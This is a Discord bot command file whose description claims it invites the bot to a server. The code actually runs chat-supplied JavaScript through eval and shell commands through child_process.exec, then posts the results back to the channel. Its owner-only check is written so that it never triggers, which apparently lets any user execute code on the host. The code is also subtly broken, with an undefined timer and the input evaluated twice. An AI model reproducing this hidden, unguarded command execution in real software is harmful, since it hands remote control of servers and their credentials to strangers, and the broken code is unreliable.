const Discord = require('discord.js');
const client = new Discord.Client();

module.exports = {
	category: 'hidden',
	aliases: [''],
	minArgs: 0,
	maxArgs: -1,
	
	expectedArgs: '',
	description: 'invite trickedbot to your server',
	callback: (message, args) => {
if (!message.author.id == 336465356304678913) {
			         const adminOnly = {
            title : `Oops!`,
            description :`Only tricked can use this command`,
            color : `BLACK`
    }
    try{
    return message.channel.send({embed: adminOnly}); 
    } catch (error) {error;}
			return;
        }
        // Time taken ${client.ws.ping}ms
        // add some reminders
        const a1 = 'eval'
        const a2 = "exec"
        const a3 = "blacklist"
        //
        // add client
        const client = this.client;
        //
        //add a standart input
        const input = args.slice(1).join(' ');
        //
        if(args[0] == a1) {
        //eval code



		try {
			eval(input);
		} catch (err) {
            let Done = {
            title : `Eval`,
            color : `BLACK`,
            footer: {
		        text: `Time taken: ${Date.now() - time}ms`,
		        icon_url: '',
	        },
            fields : [{
                name  : "🍞Input",
                value : [
                    "```js",
                    input,
                    "```"
                ].join("\n")
            },
            {
                name  : "🫓Output",
                value : [
                    "```js",
                    err,
                    "```"
                ].join("\n")
            }
            ]
            }
            try{
            return message.channel.send({embed: Done}); 
            } catch (error) {error;}

		} finally {
            let Done = {
            title : `Eval`,
            color : `BLACK`,
            footer: {
		        text: `Time taken: ${Date.now() - time}ms`,
		        icon_url: '',
	        },
            fields : [{
                name  : "🍞Input",
                value : [
                    "```js",
                    input,
                    "```"
                ].join("\n")
            },
            {
                name  : "🫓Output",
                value : [
                    "```js",
                    eval(input),
                    "```"
                ].join("\n")
            }
            ]
            }
            try{
            return message.channel.send({embed: Done}); 
            } catch (error) {error;}
        }
        //
        } else if(args[0] == a2){
            //exec code
            const { exec } = require("child_process");
            exec(input, async (error, stdout, stderr) => {
            if (error) {console.log(`error: ${error.message}`);return;}
            if (stderr) {console.log(`stderr: ${stderr}`);return;}
            
                    let Done = {
            title : `Eval`,
            color : `BLACK`,
            footer: {
		        text: `Time taken: ${Date.now() - time}ms`,
		        icon_url: '',
	        },
            fields : [{
                name  : "🍞Input",
                value : [
                    "```bash",
                    input,
                    "```"
                ].join("\n")
            },
            {
                name  : "🫓Output",
                value : [
                    "```bash",
                    stdout,
                    "```"
                ].join("\n")
            }
            ]
            }
            try{
            return message.channel.send({embed: Done}); 
            } catch (error) {error;}
        })
            

        
        } else if(args[0] == a3) {

        }
    }
}